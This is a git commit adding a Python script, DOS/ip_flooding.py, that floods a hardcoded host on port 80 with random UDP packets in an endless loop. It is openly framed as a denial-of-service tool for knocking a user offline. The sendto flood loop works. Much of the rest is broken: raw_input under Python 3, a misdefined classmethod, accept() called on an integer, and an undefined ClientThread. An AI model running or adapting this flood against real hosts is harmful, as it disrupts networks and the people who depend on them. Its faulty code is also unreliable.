94faa603d1a151dd84d000cd7108670808699a2f
Dr.Savage <shlokmishra29@gmail.com>
2020-08-17 22:50:33 +0530

    Create ip_flooding.py

---
+++ DOS/ip_flooding.py
@@ -0,0 +1,59 @@
+#!/usr/bin/python3.7
+
+import socket
+import threading
+import random
+import time
+
+class flooding:
+	def __init__(self, host, port):
+		threading.Thread.__init__(self)
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		self.host = host
+		self.port = 80
+		self.duration = 0
+		self.bytes = random._urandom(1024)
+		self.send = 0
+
+	@classmethod
+	def input(name):
+		return name(
+			raw_input("Host: "),
+                        int(raw_input("Port: "))
+                )
+
+	def send_packet(self):
+		while True:
+			try:
+				send_all = self.connection.sendto(self.bytes,(self.host, self.port))
+				print("[+]flooding started on" + self.host)
+			except UnboundLocalError:
+				try:
+					pass
+					send_all = self.connection.sendto(self.bytes,(self.host, self.port))
+				except:
+					pass
+			except KeyboardInterrupt:
+				print("\n")
+				print("[+]Existing... ")
+				print("\n")
+		while True:
+			connect_all = send_all.accept()
+			newthread = ClientThread(send_all)
+			newthread.start()
+
+			print("ctrl+c")
+			more_dos = input("[+] would you like to boot a user offline[exit/return]")
+
+			if more_dos == "exit":
+				self.connection.close()
+				exit()
+			elif more_dos == "return":
+				self.send_packet()
+			else:
+				self.connection.close()
+				exit()
+
+attack = flooding("192.168.83.113",80)
+attack.send_packet()
